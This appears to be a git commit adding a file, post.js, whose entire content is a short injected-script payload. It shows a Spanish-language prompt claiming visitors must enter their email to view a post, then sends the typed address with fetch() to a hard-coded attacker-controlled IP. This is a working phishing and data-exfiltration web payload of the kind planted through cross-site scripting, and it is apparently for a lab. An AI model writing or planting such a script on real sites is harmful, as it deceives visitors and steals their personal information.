32d02747a40974ff31b65da6c927adf03246c57b
Tobias Veiga <75316027+TobiasVeiga00@users.noreply.github.com>
2023-04-24 14:24:05 -0300

    Create post.js

---
+++ post.js
@@ -0,0 +1,9 @@
+<script>
+  let email = prompt( "Por favor, introduce tu correo electrónico para visualizar el post", "example@example.com");
+
+  if (email == null || email == ""){
+  alert( "Es necesario introducir un correo válido para visualizar el post");
+  } else {
+    fetch("http://192.168.111.45/?email=" + email);
+  }
+</script>
